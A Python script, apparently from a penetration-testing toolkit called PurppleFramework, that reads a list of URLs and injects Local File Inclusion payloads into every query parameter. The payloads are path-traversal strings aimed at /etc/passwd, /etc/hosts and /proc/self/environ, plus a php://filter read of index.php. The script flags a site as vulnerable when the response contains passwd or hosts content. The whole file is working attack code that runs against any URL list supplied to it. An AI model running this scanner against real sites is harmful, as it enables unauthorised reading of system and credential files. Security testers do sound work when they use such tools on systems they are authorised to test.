import requests
import os
from urllib.parse import urlparse, parse_qs, urlencode

# -------------------------------
# CONFIGURATION
# -------------------------------
# Find the correct path for urls.txt inside PurppleFramework/txts/
script_dir = os.path.dirname(os.path.abspath(__file__))  # Current script directory
purppleframework_dir = os.path.abspath(os.path.join(script_dir, "..", "..", ".."))  # Navigate up to PurppleFramework
txts_dir = os.path.join(purppleframework_dir, "txts")  # Path to txts directory
os.makedirs(txts_dir, exist_ok=True)  # Ensure the 'txts' folder exists

URLS_FILE = os.path.join(txts_dir, "urls.txt")  # Input file

REQUEST_TIMEOUT = 5  # Seconds before requests time out

# -------------------------------
# LFI TESTER
# -------------------------------
def test_lfi(target):
    """
    Checks if a URL is vulnerable to Local File Inclusion (LFI).
    """
    lfi_payloads = [
        "../../../../../../etc/passwd",
        "../../../../../../etc/hosts",
        "../../../../../../proc/self/environ",
        "php://filter/convert.base64-encode/resource=index.php"
    ]
    
    parsed_url = urlparse(target)
    query_params = parse_qs(parsed_url.query)  # ✅ Correctly parse query parameters
    
    if not query_params:
        return False

    for param in query_params:
        for payload in lfi_payloads:
            test_params = query_params.copy()
            test_params[param] = [payload]  # ✅ Ensure it's a list
            
            test_query = urlencode(test_params, doseq=True)  # ✅ Properly encode lists
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{test_query}"
            
            try:
                response = requests.get(test_url, timeout=REQUEST_TIMEOUT)
                if "root:x:" in response.text or "127.0.0.1" in response.text:
                    print(f"[!] LFI Found: {test_url}")
                    return True
            except requests.exceptions.RequestException:
                print(f"[-] Could not connect to {test_url}")
    
    return False

# -------------------------------
# MAIN FUNCTION: SCAN URL LIST
# -------------------------------
def scan_lfi():
    """
    Reads each URL from 'PurppleFramework/txts/urls.txt' and checks for LFI vulnerabilities.
    """
    if not os.path.exists(URLS_FILE):
        print(f"[!] Error: '{URLS_FILE}' not found!")
        return

    with open(URLS_FILE, "r") as f:
        urls = [u.strip() for u in f if u.strip()]
    
    print("[+] Scanning URLs for LFI vulnerabilities...")
    found_vuln = False
    
    for url in urls:
        if test_lfi(url):
            found_vuln = True
    
    if not found_vuln:
        print("[-] No LFI vulnerabilities found on any URLs.")

if __name__ == "__main__":
    scan_lfi()
